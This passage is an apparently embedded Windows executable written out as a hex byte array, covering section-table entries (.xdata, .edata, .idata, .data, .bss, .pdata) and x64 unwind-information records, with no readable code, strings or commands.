0x41, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x6d, 0x1, 0x0, 0x8, 0x0, 0x0, 0x0, 0x2e, 0x72, 0x74, 0x63, 0x24, 0x54, 0x5a, 0x5a, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x6d, 0x1, 0x0, 0xb8, 0xd, 0x0, 0x0, 0x2e, 0x78, 0x64, 0x61, 0x74, 0x61, 0x0, 0x0, 0xb0, 0x7b, 0x1, 0x0, 0x90, 0x0, 0x0, 0x0, 0x2e, 0x78, 0x64, 0x61, 0x74, 0x61, 0x24, 0x78, 0x0, 0x0, 0x0, 0x0, 0x40, 0x7c, 0x1, 0x0, 0x44, 0x0, 0x0, 0x0, 0x2e, 0x65, 0x64, 0x61, 0x74, 0x61, 0x0, 0x0, 0x84, 0x7c, 0x1, 0x0, 0x28, 0x0, 0x0, 0x0, 0x2e, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x32, 0x0, 0x0, 0x0, 0x0, 0xac, 0x7c, 0x1, 0x0, 0x14, 0x0, 0x0, 0x0, 0x2e, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x33, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x7c, 0x1, 0x0, 0xb0, 0x2, 0x0, 0x0, 0x2e, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x34, 0x0, 0x0, 0x0, 0x0, 0x70, 0x7f, 0x1, 0x0, 0x2c, 0x6, 0x0, 0x0, 0x2e, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x36, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x1, 0x0, 0x20, 0xb, 0x0, 0x0, 0x2e, 0x64, 0x61, 0x74, 0x61, 0x0, 0x0, 0x0, 0x20, 0x9b, 0x1, 0x0, 0x50, 0x0, 0x0, 0x0, 0x2e, 0x64, 0x61, 0x74, 0x61, 0x24, 0x72, 0x0, 0x70, 0x9b, 0x1, 0x0, 0x20, 0x0, 0x0, 0x0, 0x2e, 0x64, 0x61, 0x74, 0x61, 0x24, 0x72, 0x73, 0x0, 0x0, 0x0, 0x0, 0x90, 0x9b, 0x1, 0x0, 0xb0, 0x11, 0x0, 0x0, 0x2e, 0x62, 0x73, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x1, 0x0, 0xf0, 0xf, 0x0, 0x0, 0x2e, 0x70, 0x64, 0x61, 0x74, 0x61, 0x0, 0x0, 0x0, 0xc0, 0x1, 0x0, 0xf4, 0x0, 0x0, 0x0, 0x5f, 0x52, 0x44, 0x41, 0x54, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x17, 0x1, 0x0, 0x17, 0xa2, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0xa2, 0x0, 0x0, 0x1, 0x12, 0x1, 0x0, 0x12, 0x62, 0x0, 0x0, 0x11, 0x15, 0x8, 0x0, 0x15, 0x74, 0x9, 0x0, 0x15, 0x64, 0x7, 0x0, 0x15, 0x34, 0x6, 0x0, 0x15, 0x32, 0x11, 0xe0, 0x8, 0x24, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0xcc, 0x12, 0x0, 0x0, 0x3b, 0x13, 0x0, 0x0, 0xe0, 0xe4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9e, 0x13, 0x0, 0x0, 0xa9, 0x13, 0x0, 0x0, 0xe0, 0xe4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x6, 0x2, 0x0, 0x6, 0x32, 0x2, 0x50, 0x11, 0xa, 0x4, 0x0, 0xa, 0x34, 0x8, 0x0, 0xa, 0x52, 0x6, 0x70, 0x8, 0x24, 0x0, 0x0, 0x4, 0x0, 0x0, 0x0, 0xe3, 0x13, 0x0, 0x0, 0x2, 0x14, 0x0, 0x0, 0xf7, 0xe4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x13, 0x0, 0x0, 0x1a, 0x14, 0x0, 0x0, 0x10, 0xe5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x23, 0x14, 0x0, 0x0, 0x2e, 0x14, 0x0, 0x0, 0xf7, 0xe4, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x23, 0x14, 0x0, 0x0, 0x2f, 0x14, 0x0, 0x0, 0x10, 0xe5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0x42, 0x0, 0x0, 0x9, 0x1a, 0x6, 0x0, 0x1a, 0x34, 0xf, 0x0, 0x1a, 0x72, 0x16, 0xe0, 0x14, 0x70, 0x13, 0x60, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x65, 0x14, 0x0, 0x0, 0x4b, 0x15, 0x0, 0x0, 0x24, 0xe5, 0x0, 0x0, 0x4b, 0x15, 0x0, 0x0, 0x1, 0x6, 0x2, 0x0, 0x6, 0x52, 0x2, 0x50, 0x1, 0xf, 0x6, 0x0, 0xf, 0x64, 0x7, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x1, 0xd, 0x4, 0x0, 0xd, 0x34, 0x9, 0x0, 0xd, 0x32, 0x6, 0x50, 0x9, 0x4, 0x1, 0x0, 0x4, 0x22, 0x0, 0x0, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xe3, 0x18, 0x0, 0x0, 0x6d, 0x19, 0x0, 0x0, 0x5a, 0xe5, 0x0, 0x0, 0x6d, 0x19, 0x0, 0x0, 0x1, 0x2, 0x1, 0x0, 0x2, 0x50, 0x0, 0x0, 0x1, 0x6, 0x2, 0x0, 0x6, 0x32, 0x2, 0x30, 0x1, 0x14, 0x8, 0x0, 0x14, 0x64, 0x8, 0x0, 0x14, 0x54, 0x7, 0x0, 0x14, 0x34, 0x6, 0x0, 0x14, 0x32, 0x10, 0x70, 0x1, 0x15, 0x5, 0x0, 0x15, 0x34, 0xba, 0x0, 0x15, 0x1, 0xb8, 0x0, 0x6, 0x50, 0x0, 0x0, 0x1, 0xa, 0x4, 0x0, 0xa, 0x34, 0x6, 0x0, 0xa, 0x32, 0x6, 0x70, 0x1, 0xf, 0x6, 0x0, 0xf, 0x64, 0x6, 0x0, 0xf, 0x34, 0x5, 0x0, 0xf, 0x12, 0xb, 0x70, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x2, 0x4, 0x0, 0x3, 0x16, 0x0, 0x6, 0x2, 0x60, 0x1, 0x70, 0x1, 0x0, 0x0, 0x0, 0x1, 0x1c, 0xc, 0x0, 0x1c, 0x64, 0x10, 0x0, 0x1c, 0x54, 0xf, 0x0, 0x1c, 0x34, 0xe, 0x0, 0x1c, 0x72, 0x18, 0xf0, 0x16, 0xe0, 0x14, 0xd0, 0x12, 0xc0, 0x10, 0x70, 0x9, 0xd, 0x1, 0x0, 0xd, 0x82, 0x0, 0x0, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1d, 0x27, 0x0, 0x0, 0x2c, 0x27, 0x0, 0x0, 0x72, 0xe5, 0x0, 0x0, 0x2c, 0x27, 0x0, 0x0, 0x1, 0x7, 0x3, 0x0, 0x7, 0x42, 0x3, 0x50, 0x2, 0x30, 0x0, 0x0, 0x2, 0x1, 0x3, 0x0, 0x2, 0x16, 0x0, 0x6, 0x1, 0x70, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x16, 0xa, 0x0, 0x16, 0x54, 0xc, 0x0, 0x16, 0x34, 0xb, 0x0, 0x16, 0x32, 0x12, 0xf0, 0x10, 0xe0, 0xe, 0xc0, 0xc, 0x70, 0xb, 0x60, 0x19, 0x1c, 0x3, 0x0, 0xe, 0x1, 0x1c, 0x0, 0x2, 0x50, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0xd0, 0x0, 0x0, 0x0, 0x1, 0x14, 0x8, 0x0, 0x14, 0x64, 0xd, 0x0, 0x14, 0x54, 0xc, 0x0, 0x14, 0x34, 0xb, 0x0, 0x14, 0x72, 0x10, 0x70, 0x9, 0x18, 0x2, 0x0, 0x18, 0xd2, 0x14, 0x30, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xa7, 0x2c, 0x0, 0x0, 0xc7, 0x2c, 0x0, 0x0, 0x8, 0xe6, 0x0, 0x0, 0xc7, 0x2c, 0x0, 0x0, 0x1, 0x7, 0x3, 0x0, 0x7, 0x82, 0x3, 0x50, 0x2, 0x30, 0x0, 0x0, 0x1, 0x1c, 0xc, 0x0, 0x1c, 0x64, 0xc, 0x0, 0x1c, 0x54, 0xb, 0x0, 0x1c, 0x34, 0xa, 0x0, 0x1c, 0x32, 0x18, 0xf0, 0x16, 0xe0, 0x14, 0xd0, 0x12, 0xc0, 0x10, 0x70, 0x19, 0x1e, 0x8, 0x0, 0x1e, 0x52, 0x1a, 0xf0, 0x18, 0xe0, 0x16, 0xd0, 0x14, 0xc0, 0x12, 0x70, 0x11, 0x60, 0x10, 0x30, 0x8, 0x24, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0xf6, 0x47, 0x0, 0x0, 0x88, 0x48, 0x0, 0x0, 0x36, 0xe7, 0x0, 0x0, 0x88, 0x48, 0x0, 0x0, 0xbb, 0x47, 0x0, 0x0, 0xaf, 0x48, 0x0, 0x0, 0x4c, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xea, 0x48, 0x0, 0x0, 0xf0, 0x48, 0x0, 0x0, 0x4c, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x19, 0x10, 0x8, 0x0, 0x10, 0xd2, 0xc, 0xf0, 0xa, 0xe0, 0x8, 0xd0, 0x6, 0xc0, 0x4, 0x70, 0x3, 0x60, 0x2, 0x30, 0x8, 0x24, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0xcd, 0x45, 0x0, 0x0, 0xf2, 0x45, 0x0, 0x0, 0x99, 0xe6, 0x0, 0x0, 0xf2, 0x45, 0x0, 0x0, 0xcd, 0x45, 0x0, 0x0, 0x6a, 0x46, 0x0, 0x0, 0xbe, 0xe6, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1c, 0xc, 0x0, 0x1c, 0x64, 0xd, 0x0, 0x1c, 0x54, 0xc, 0x0, 0x1c, 0x34, 0xa, 0x0, 0x1c, 0x32, 0x18, 0xf0, 0x16, 0xe0, 0x14, 0xd0, 0x12, 0xc0, 0x10, 0x70, 0x1, 0x19, 0xa, 0x0, 0x19, 0x74, 0xf, 0x0, 0x19, 0x64, 0xe, 0x0, 0x19, 0x54, 0xd, 0x0, 0x19, 0x34, 0xc, 0x0, 0x19, 0x92, 0x15, 0xe0, 0x1, 0x19, 0xa, 0x0, 0x19, 0x74, 0x9, 0x0, 0x19, 0x64, 0x8, 0x0, 0x19, 0x54, 0x7, 0x0, 0x19, 0x34, 0x6, 0x0, 0x19, 0x32, 0x15, 0xe0, 0x9, 0x19, 0xa, 0x0, 0x19, 0x74, 0xc, 0x0, 0x19, 0x64, 0xb, 0x0, 0x19, 0x34, 0xa, 0x0, 0x19, 0x52, 0x15, 0xf0, 0x13, 0xe0, 0x11, 0xd0, 0x8, 0x24, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0xad, 0x36, 0x0, 0x0, 0xe2, 0x37, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x38, 0x0, 0x0, 0x2, 0x38, 0x0, 0x0, 0x1c, 0x38, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x38, 0x0, 0x0, 0x9, 0x15, 0x8, 0x0, 0x15, 0x74, 0x8, 0x0, 0x15, 0x64, 0x7, 0x0, 0x15, 0x34, 0x6, 0x0, 0x15, 0x32, 0x11, 0xe0, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x52, 0x38, 0x0, 0x0, 0xc8, 0x38, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xde, 0x38, 0x0, 0x0, 0x19, 0x27, 0xa, 0x0, 0x19, 0x1, 0x25, 0x0, 0xd, 0xf0, 0xb, 0xe0, 0x9, 0xd0, 0x7, 0xc0, 0x5, 0x70, 0x4, 0x60, 0x3, 0x30, 0x2, 0x50, 0x1c, 0xdf, 0x0, 0x0, 0x10, 0x1, 0x0, 0x0, 0x1, 0x1a, 0xa, 0x0, 0x1a, 0x34, 0x14, 0x0, 0x1a, 0xb2, 0x16, 0xf0, 0x14, 0xe0, 0x12, 0xd0, 0x10, 0xc0, 0xe, 0x70, 0xd, 0x60, 0xc, 0x50, 0x1, 0x25, 0xb, 0x0, 0x25, 0x34, 0x23, 0x0, 0x25, 0x1, 0x18, 0x0, 0x1a, 0xf0, 0x18, 0xe0, 0x16, 0xd0, 0x14, 0xc0, 0x12, 0x70, 0x11, 0x60, 0x10, 0x50, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0x42, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0x42, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0x42, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0x42, 0x0, 0x0, 0x1, 0x15, 0x8, 0x0, 0x15, 0x74, 0x8, 0x0, 0x15, 0x64, 0x7, 0x0, 0x15, 0x34, 0x6, 0x0, 0x15, 0x32, 0x11, 0xe0, 0x1, 0xf, 0x6, 0x0, 0xf, 0x64, 0xf, 0x0, 0xf, 0x34, 0xe, 0x0, 0xf, 0x92, 0xb, 0x70, 0x1, 0xf, 0x4, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x19, 0xf, 0x2, 0x0, 0x6, 0x52, 0x2, 0x30, 0xb0, 0x31, 0x0, 0x0, 0x48, 0x4, 0x1, 0x0, 0x46, 0x52, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x19, 0x1e, 0x4, 0x0, 0x1e, 0x34, 0xc, 0x0, 0x11, 0x92, 0xa, 0x50, 0xb0, 0x31, 0x0, 0x0, 0x70, 0x4, 0x1, 0x0, 0xff, 0xff, 0xff, 0xff, 0x14, 0x28, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6e, 0x51, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9, 0x6, 0x2, 0x0, 0x6, 0x52, 0x2, 0x30, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1d, 0x50, 0x0, 0x0, 0x76, 0x50, 0x0, 0x0, 0x89, 0xe7, 0x0, 0x0, 0xc1, 0x50, 0x0, 0x0, 0x11, 0xf, 0x4, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xe1, 0x4f, 0x0, 0x0, 0xea, 0x4f, 0x0, 0x0, 0x6f, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x13, 0x8, 0x0, 0x13, 0x34, 0xc, 0x0, 0x13, 0x52, 0xc, 0xf0, 0xa, 0xe0, 0x8, 0x70, 0x7, 0x60, 0x6, 0x50, 0x1, 0x1d, 0xc, 0x0, 0x1d, 0x74, 0xb, 0x0, 0x1d, 0x64, 0xa, 0x0, 0x1d, 0x54, 0x9, 0x0, 0x1d, 0x34, 0x8, 0x0, 0x1d, 0x32, 0x19, 0xf0, 0x17, 0xe0, 0x15, 0xc0, 0x11, 0xd, 0x1, 0x0, 0x4, 0x62, 0x0, 0x0, 0xb0, 0x31, 0x0, 0x0, 0xc0, 0x4, 0x1, 0x0, 0x1, 0x19, 0xa, 0x0, 0x19, 0x74, 0xb, 0x0, 0x19, 0x64, 0xa, 0x0, 0x19, 0x54, 0x9, 0x0, 0x19, 0x34, 0x8, 0x0, 0x19, 0x52, 0x15, 0xe0, 0x11, 0x13, 0x1, 0x0, 0xb, 0x62, 0x0, 0x0, 0xb0, 0x31, 0x0, 0x0, 0xe8, 0x4, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x5a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x18, 0xa, 0x0, 0x18, 0x64, 0xa, 0x0, 0x18, 0x54, 0x9, 0x0, 0x18, 0x34, 0x8, 0x0, 0x18, 0x32, 0x14, 0xf0, 0x12, 0xe0, 0x10, 0x70, 0x11, 0xf, 0x4, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xa1, 0x58, 0x0, 0x0, 0xab, 0x58, 0x0, 0x0, 0x6f, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x19, 0x4, 0x1, 0x0, 0x4, 0x42, 0x0, 0x0, 0x68, 0xe3, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xe, 0x5c, 0x0, 0x0, 0x20, 0x5c, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x20, 0x5c, 0x0, 0x0, 0x1, 0x6, 0x2, 0x0, 0x6, 0x32, 0x2, 0x70, 0x21, 0x5, 0x2, 0x0, 0x5, 0x34, 0x7, 0x0, 0x0, 0x5d, 0x0, 0x0, 0xf, 0x5d, 0x0, 0x0, 0xb4, 0x73, 0x1, 0x0, 0x21, 0x0, 0x0, 0x0, 0x0, 0x5d, 0x0, 0x0, 0xf, 0x5d, 0x0, 0x0, 0xb4, 0x73, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0xa, 0x2, 0x0, 0xa, 0x32, 0x6, 0x30, 0x1, 0x9, 0x2, 0x0, 0x9, 0x92, 0x2, 0x50, 0x1, 0x9, 0x2, 0x0, 0x9, 0x72, 0x2, 0x50, 0x11, 0xf, 0x4, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xd1, 0x5e, 0x0, 0x0, 0xe1, 0x5e, 0x0, 0x0, 0x6f, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x11, 0xf, 0x4, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x51, 0x5f, 0x0, 0x0, 0x67, 0x5f, 0x0, 0x0, 0x6f, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x11, 0xf, 0x4, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x99, 0x5f, 0x0, 0x0, 0xc9, 0x5f, 0x0, 0x0, 0x6f, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x11, 0xf, 0x4, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x11, 0x5f, 0x0, 0x0, 0x1f, 0x5f, 0x0, 0x0, 0x6f, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x0, 0x4, 0x62, 0x0, 0x0, 0x19, 0x2e, 0x9, 0x0, 0x1d, 0x64, 0xc4, 0x0, 0x1d, 0x34, 0xc3, 0x0, 0x1d, 0x1, 0xbe, 0x0, 0xe, 0xe0, 0xc, 0x70, 0xb, 0x50, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0xe0, 0x5, 0x0, 0x0, 0x1, 0x14, 0x8, 0x0, 0x14, 0x64, 0xa, 0x0, 0x14, 0x54, 0x9, 0x0, 0x14, 0x34, 0x8, 0x0, 0x14, 0x52, 0x10, 0x70, 0x1, 0xf, 0x6, 0x0, 0xf, 0x64, 0x8, 0x0, 0xf, 0x34, 0x7, 0x0, 0xf, 0x32, 0xb, 0x70, 0x1, 0xd, 0x4, 0x0, 0xd, 0x34, 0x10, 0x0, 0xd, 0xd2, 0x6, 0x50, 0x1, 0x17, 0xa, 0x0, 0x17, 0x34, 0x12, 0x0, 0x17, 0x92, 0x10, 0xf0, 0xe, 0xe0, 0xc, 0xd0, 0xa, 0xc0, 0x8, 0x70, 0x7, 0x60, 0x6, 0x50, 0x1, 0x19, 0xa, 0x0, 0x19, 0x74, 0xd, 0x0, 0x19, 0x64, 0xc, 0x0, 0x19, 0x54, 0xb, 0x0, 0x19, 0x34, 0xa, 0x0, 0x19, 0x72, 0x15, 0xe0, 0x1, 0x1c, 0xc, 0x0, 0x1c, 0x64, 0xe, 0x0, 0x1c, 0x54, 0xd, 0x0, 0x1c, 0x34, 0xc, 0x0, 0x1c, 0x52, 0x18, 0xf0, 0x16, 0xe0, 0x14, 0xd0, 0x12, 0xc0, 0x10, 0x70, 0x19, 0x2b, 0x9, 0x0, 0x1a, 0x1, 0x68, 0x0, 0xb, 0xe0, 0x9, 0xd0, 0x7, 0xc0, 0x5, 0x70, 0x4, 0x60, 0x3, 0x30, 0x2, 0x50, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0x30, 0x3, 0x0, 0x0, 0x19, 0x2b, 0x7, 0x0, 0x1a, 0x74, 0x58, 0x0, 0x1a, 0x34, 0x57, 0x0, 0x1a, 0x1, 0x54, 0x0, 0xb, 0x50, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0x90, 0x2, 0x0, 0x0, 0x1, 0x14, 0x8, 0x0, 0x14, 0x64, 0xc, 0x0, 0x14, 0x54, 0xb, 0x0, 0x14, 0x34, 0xa, 0x0, 0x14, 0x72, 0x10, 0x70, 0x19, 0x25, 0xa, 0x0, 0x16, 0x54, 0x11, 0x0, 0x16, 0x34, 0x10, 0x0, 0x16, 0x72, 0x12, 0xf0, 0x10, 0xe0, 0xe, 0xc0, 0xc, 0x70, 0xb, 0x60, 0x1c, 0xdf, 0x0, 0x0, 0x38, 0x0, 0x0, 0x0, 0x1, 0x6, 0x2, 0x0, 0x6, 0x72, 0x2, 0x30, 0x19, 0xf, 0x6, 0x0, 0xf, 0x64, 0x8, 0x0, 0xf, 0x34, 0x7, 0x0, 0xf, 0x32, 0xb, 0x70, 0x68, 0xe3, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xf9, 0x80, 0x0, 0x0, 0x48, 0x81, 0x0, 0x0, 0xd0, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x25, 0x9, 0x0, 0x25, 0x64, 0x53, 0x0, 0x25, 0x34, 0x52, 0x0, 0x25, 0x1, 0x4e, 0x0, 0x17, 0xe0, 0x15, 0x70, 0x14, 0x50, 0x0, 0x0, 0x19, 0x2b, 0x7, 0x0, 0x1a, 0x74, 0xf4, 0x0, 0x1a, 0x34, 0xf3, 0x0, 0x1a, 0x1, 0xf0, 0x0, 0xb, 0x50, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0x70, 0x7, 0x0, 0x0, 0x11, 0xf, 0x4, 0x0, 0xf, 0x34, 0xa, 0x0, 0xf, 0x72, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x95, 0x79, 0x0, 0x0, 0x34, 0x7b, 0x0, 0x0, 0xb6, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0xf, 0x6, 0x0, 0xf, 0x64, 0xb, 0x0, 0xf, 0x34, 0xa, 0x0, 0xf, 0x72, 0xb, 0x70, 0x1, 0x6, 0x3, 0x0, 0x6, 0x34, 0x2, 0x0, 0x6, 0x70, 0x0, 0x0, 0x1, 0x5, 0x2, 0x0, 0x5, 0x74, 0x2, 0x0, 0x1, 0x14, 0x8, 0x0, 0x14, 0x64, 0xe, 0x0, 0x14, 0x54, 0xd, 0x0, 0x14, 0x34, 0xc, 0x0, 0x14, 0x92, 0x10, 0x70, 0x11, 0x6, 0x2, 0x0, 0x6, 0x32, 0x2, 0x30, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xe2, 0x8e, 0x0, 0x0, 0xf9, 0x8e, 0x0, 0x0, 0xe9, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1c, 0xb, 0x0, 0x1c, 0x74, 0x17, 0x0, 0x1c, 0x64, 0x16, 0x0, 0x1c, 0x54, 0x15, 0x0, 0x1c, 0x34, 0x14, 0x0, 0x1c, 0x1, 0x12, 0x0, 0x15, 0xe0, 0x0, 0x0, 0x11, 0x6, 0x2, 0x0, 0x6, 0x32, 0x2, 0x30, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x7a, 0x90, 0x0, 0x0, 0x90, 0x90, 0x0, 0x0, 0x2, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x7, 0x1, 0x0, 0x7, 0x42, 0x0, 0x0, 0x11, 0x11, 0x8, 0x0, 0x11, 0x34, 0x11, 0x0, 0x11, 0x72, 0xd, 0xe0, 0xb, 0xd0, 0x9, 0xc0, 0x7, 0x70, 0x6, 0x60, 0x8, 0x24, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x59, 0x92, 0x0, 0x0, 0x17, 0x93, 0x0, 0x0, 0x18, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9d, 0x93, 0x0, 0x0, 0xb5, 0x93, 0x0, 0x0, 0x18, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x11, 0xf, 0x4, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xba, 0x90, 0x0, 0x0, 0xd0, 0x90, 0x0, 0x0, 0x6f, 0xe7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x12, 0x6, 0x0, 0x12, 0x74, 0xf, 0x0, 0x12, 0x34, 0xe, 0x0, 0x12, 0xb2, 0xb, 0x50, 0x1, 0xc, 0x2, 0x0, 0xc, 0x72, 0x5, 0x50, 0x11, 0xf, 0x4, 0x0, 0xf, 0x34, 0x6, 0x0, 0xf, 0x32, 0xb, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x36, 0x94, 0x0, 0x0, 0x9f, 0x94, 0x0, 0x0, 0x39, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x11, 0x12, 0x6, 0x0, 0x12, 0x34, 0x10, 0x0, 0x12, 0xb2, 0xe, 0xe0, 0xc, 0x70, 0xb, 0x60, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xd4, 0x94, 0x0, 0x0, 0x7c, 0x95, 0x0, 0x0, 0x54, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x11, 0x14, 0x6, 0x0, 0x14, 0x64, 0x9, 0x0, 0x14, 0x34, 0x8, 0x0, 0x14, 0x52, 0x10, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xe7, 0x9b, 0x0, 0x0, 0x1f, 0x9c, 0x0, 0x0, 0x71, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x11, 0xa, 0x4, 0x0, 0xa, 0x34, 0x6, 0x0, 0xa, 0x32, 0x6, 0x70, 0x8, 0x24, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xe1, 0x9f, 0x0, 0x0, 0xf3, 0x9f, 0x0, 0x0, 0x8b, 0xe8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x19, 0x1f, 0x5, 0x0, 0xd, 0x1, 0x8a, 0x0, 0x6, 0xe0, 0x4, 0xd0, 0x2, 0xc0, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0x10, 0x4, 0x0, 0x0, 0x21, 0x28, 0xa, 0x0, 0x28, 0xf4, 0x85, 0x0, 0x20, 0x74, 0x86, 0x0, 0x18, 0x64, 0x87, 0x0, 0x10, 0x54, 0x88, 0x0, 0x8, 0x34, 0x89, 0x0, 0x90, 0xa0, 0x0, 0x0, 0xeb, 0xa0, 0x0, 0x0, 0xd4, 0x77, 0x1, 0x0, 0x21, 0x0, 0x0, 0x0, 0x90, 0xa0, 0x0, 0x0, 0xeb, 0xa0, 0x0, 0x0, 0xd4, 0x77, 0x1, 0x0, 0x1, 0xb, 0x5, 0x0, 0xb, 0x64, 0x3, 0x0, 0xb, 0x34, 0x2, 0x0, 0xb, 0x70, 0x0, 0x0, 0x19, 0x13, 0x1, 0x0, 0x4, 0xa2, 0x0, 0x0, 0x1c, 0xdf, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 